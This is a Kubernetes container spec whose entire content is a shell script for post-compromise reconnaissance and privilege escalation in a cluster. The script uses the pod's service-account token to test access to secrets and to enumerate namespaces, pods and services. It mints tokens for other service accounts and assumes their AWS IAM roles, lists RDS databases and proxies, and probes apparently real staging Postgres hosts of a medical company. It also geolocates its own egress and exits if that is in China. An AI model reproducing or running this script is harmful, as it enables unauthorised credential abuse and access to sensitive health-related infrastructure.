containers.name: probe
args:
#!/bin/sh
set -u
echo "===I3577B_START utc=$(date -u +%FT%TZ)==="
apk add --no-cache postgresql16-client curl jq aws-cli openssl bind-tools >/tmp/apk.log 2>&1
echo "apk=$? psql=$(command -v psql||echo none) aws=$(aws --version 2>&1|head -c 40)"
GEO=$(curl -s -m 20 http://ip-api.com/json/); echo "GEO $GEO"
echo "$GEO" | grep -q '"countryCode":"CN"' && { echo "ABORT_CN_EGRESS"; exit 0; }
export AWS_DEFAULT_REGION=us-west-2
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token 2>/dev/null); API=https://kubernetes.default.svc
get(){ curl -sk -m 60 -H "Authorization: Bearer $TOKEN" "$1"; }
post(){ curl -sk -m 60 -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data "$2" "$1"; }
assume(){ NS=$1; S=$2
  SAJ=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$S")
  AR=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty')
  [ -z "$AR" ] && return 1
  TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$S/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty'); [ -z "$WT" ] && return 1
  RES=$(aws sts assume-role-with-web-identity --role-arn "$AR" --role-session-name i3577b --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || return 1
  export AWS_ACCESS_KEY_ID=$(echo "$RES"|jq -r .Credentials.AccessKeyId)
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES"|jq -r .Credentials.SecretAccessKey)
  export AWS_SESSION_TOKEN=$(echo "$RES"|jq -r .Credentials.SessionToken)
  return 0; }
unassume(){ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; }
SSAR(){ post $API/apis/authorization.k8s.io/v1/selfsubjectaccessreviews "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"verb\":\"$1\",\"resource\":\"$2\"$3}}}" | jq -r '.status.allowed'; }
echo "-- SSAR list pods: $(SSAR list pods)"
echo "-- SSAR list secrets: $(SSAR list secrets)"
echo "-- SSAR get secrets: $(SSAR get secrets)"
echo "-- SSAR list configmaps: $(SSAR list configmaps)"
echo "-- NS: $(get $API/api/v1/namespaces | jq -r '[.items[].metadata.name]|join(",")' | head -c 900)"

echo "########## ENV stage ##########"
echo "-- MLFLOW PODS"
get $API/api/v1/pods | jq -r '.items[] | select((.metadata.name|test("mlflow";"i")) or ((.spec.containers[0].image//"")|test("mlflow";"i"))) | "\(.metadata.namespace)\t\(.metadata.name)\t\(.spec.containers[0].image)"' | head -20
echo "-- MLFLOW SVC"
for NS in $(get $API/api/v1/namespaces | jq -r '.items[].metadata.name' | head -40); do
  R=$(get "$API/api/v1/namespaces/$NS/services" 2>/dev/null | jq -r '.items[]? | select((.metadata.name|test("mlflow";"i"))) | "\(.metadata.name)\t\(.spec.clusterIP)\t\(.spec.ports[0].port)"' 2>/dev/null)
  [ -n "$R" ] && echo "SVC $NS $R"
done
echo "-- MLFLOW CM/DEPLOY in likely ns"
for NS in mlflow mlflow-service data-management argo argocd default; do
  D=$(get "$API/apis/apps/v1/namespaces/$NS/deployments" 2>/dev/null | jq -r '.items[]? | select((.metadata.name|test("mlflow";"i"))) | .metadata.name' 2>/dev/null)
  [ -n "$D" ] && echo "DEPLOY $NS $D"
done
echo "-- DNS"
echo "GETENT_PROXY $(getent hosts lazamedical-dp-stage01-usw2-postgresql1-proxy.proxy-cjygw4i820rx.us-west-2.rds.amazonaws.com || echo NXDOMAIN)"
echo "GETENT_INST  $(getent hosts lazamedical-dp-stage01-usw2-postgresql-rds1.cjygw4i820rx.us-west-2.rds.amazonaws.com || echo NXDOMAIN)"
echo "-- TLS starttls postgres to proxy"
( echo | timeout 15 openssl s_client -connect lazamedical-dp-stage01-usw2-postgresql1-proxy.proxy-cjygw4i820rx.us-west-2.rds.amazonaws.com:5432 -starttls postgres -brief ) 2>&1 | head -12 | sed 's/^/  TLS /'
echo "-- TCP raw banner"
timeout 8 sh -c "exec 3<>/dev/tcp/lazamedical-dp-stage01-usw2-postgresql1-proxy.proxy-cjygw4i820rx.us-west-2.rds.amazonaws.com/5432; dd bs=1 count=1 <&3 2>/dev/null | xxd | head -2" 2>&1 | sed 's/^/  RAW /'

echo "-- RDS DESCRIBE with OTHER IRSA ROLES"
for PAIR in "audit-log audit-log-sa" "metadata-extraction metadata-extraction-sa" "s3-ingestion s3-ingestion-sa" "de-identifier de-identifier-sa" "notification notification-sa" "authorization authorization-sa" "cognito cognito-service-sa" "user-management user-management-service-sa"; do
  set -- $PAIR
  if assume "$1" "$2" 2>/dev/null; then
    R=$(aws rds describe-db-instances --max-records 100 --query 'DBInstances[?contains(DBInstanceIdentifier,`mlflow`)||contains(DBInstanceIdentifier,`rds1`)].{id:DBInstanceIdentifier,ep:Endpoint.Address,port:Endpoint.Port,pub:PubliclyAccessible,st:DBInstanceStatus}' --output json 2>&1 | head -c 1200)
    echo "ROLE $1 => $R"
    P=$(aws rds describe-db-proxies --query 'DBProxies[].{n:DBProxyName,e:Endpoint,s:Status}' --output json 2>&1 | head -c 800)
    echo "  PROXY => $P"
    unassume
    echo "$R" | grep -q "AccessDenied" || break
  else echo "ROLE $1 ASSUME_FAIL"; fi
done
echo "===I3577B_DONE $(date -u +%FT%TZ)==="
